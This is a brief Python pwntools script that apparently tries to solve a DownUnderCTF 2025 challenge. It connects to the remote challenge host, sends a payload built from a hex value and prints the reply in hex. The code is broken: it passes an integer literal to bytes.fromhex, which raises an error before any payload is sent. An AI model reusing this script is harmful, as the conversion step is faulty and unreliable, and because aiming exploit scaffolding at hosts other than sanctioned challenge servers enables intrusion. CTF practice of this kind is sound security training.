from pwn import *

HOST = "chal.2025-us.ductf.net"
PORT = 30015

def start_binary():
    return remote(HOST, PORT)

p = start_binary()
# print(p.recv())
# hex(5914285930840626)
payload = bytes.fromhex(5914285930840626)
p.sendline(payload)
print(p.recv().hex())